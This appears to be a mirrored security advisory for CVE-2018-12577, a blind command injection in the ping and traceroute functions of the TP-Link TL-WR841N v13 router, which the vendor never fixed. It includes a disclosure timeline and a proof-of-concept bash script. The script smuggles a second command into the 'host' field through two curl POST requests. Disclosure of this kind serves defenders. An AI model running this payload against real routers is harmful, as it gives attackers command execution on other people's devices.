@@ -1,0 +1,85 @@
+id: 30651
+date: 06/30/2018
+title: TP-Link TL-WR841N V13 Command Injection Vulnerability
+author: Tim Coen
+cves: CVE-2018-12577
+
+* Vulnerability: Authenticated Blind Command Injection
+  * Affected Software: TP-Link TL-WR841N v13
+  * Affected Version: 0.9.1 4.16 v0001.0 Build 180119 Rel.65243n
+  * Patched Version: None
+
+##### Overview
+
+The ping and traceroute functionalities allow for OS command injection.
+An authenticated attacker can use this to execute arbitrary commands on
+the router by sending specifically crafter HTTP requests to it.
+
+##### CVSS
+
+High 8.7 CVSS:3.0/AV:A/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H
+
+##### Details
+
+The ping and traceroute functionalities accept user input and insert it
+into a command without sanitation. An attacker can for example insert
+further commands via a semicolon.
+
+It should be noted that a user can already gain code execution by
+uploading a custom firmware version. However, because of this
+vulnerability, an attack could be performed by a remote attacker via a
+CSRF issue in the same firmware version. Up until the previous firmware
+version the attack could also be performed by an unauthenticated
+attacker from the internal network because of a broken authentication issue.
+
+##### POC
+
+A successful attack requires the issuing of two POST requests. An attack
+can for example be performed by intercepting the POST request to "/cgi"
+and changing "host=127.0.0.1" to "host=127.0.0.1; reboot;"
+
+The following script can be used to automate the process:
+
+  if [ "$#" -ne 3 ]; then
+    echo "Usage: ./exec.sh 'user' 'pass' 'reboot'"
+  fi
+  USER=$1
+  PASS=$2
+  COMMAND=$3
+  AUTH=$(echo -ne "$USER:$PASS" | base64)
+
+  BINARY1=$'[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\x0d\x0adataBlockSize=64\x0d\x0atimeout=1\x0d\x0anumberOfRepetitions=4\x0d\x0ahost=127.0.0.1;'
+  BINARY2=$';\x0d\x0aX_TP_ConnName=ewan_ipoe_d\x0d\x0adiagnosticsState=Requested\x0d\x0a'
+  curl -i -s -k  -X 'POST' 'http://192.168.0.1/cgi?2' -H 'Referer:
+http://192.168.0.1/mainFrame.htm' -H "Cookie: Authorization=Basic $AUTH"
+--data-binary "$BINARY1$COMMAND$BINARY2"
+
+  curl -i -s -k  -X 'POST' 'http://192.168.0.1/cgi?7' -H 'Referer:
+http://192.168.0.1/mainFrame.htm' -H "Cookie: Authorization=Basic $AUTH"
+--data-binary $'[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\x0d\x0a'
+
+##### Solution
+
+The vendor did not fix the issue.
+
+As an attack is only possible by an authenticated attacker or by
+exploiting other vulnerabilities - such as CSRF issues or broken
+authentication - users are advised to use secure passwords and to
+mitigate against other vulnerabilities.
+
+##### Timeline
+
+- 05/20/2018 Requested email address via contact form (no response)
+- 05/24/2018 Send advisory to security@tp-link.com asking for
+confirmation, set disclosure date (no response)
+- 06/01/2018 Asked for confirmation at support.usa@tp-link.com
+- 06/04/2018 Vendor confirmed receipt of advisory
+- 06/12/2018 Requested Status Update
+- 06/14/2018 Vendor claims they never received advisory
+- 06/14/2018 Resend advisory asking for confirmation (no response)
+- 06/18/2018 Reminded vendor of disclosure date (no response)
+- 06/18/2018 Requested CVE
+- 06/19/2018 CVE assigned
+- 06/27/2018 Disclosure
+
+#  0day.today [2023-03-25]  #
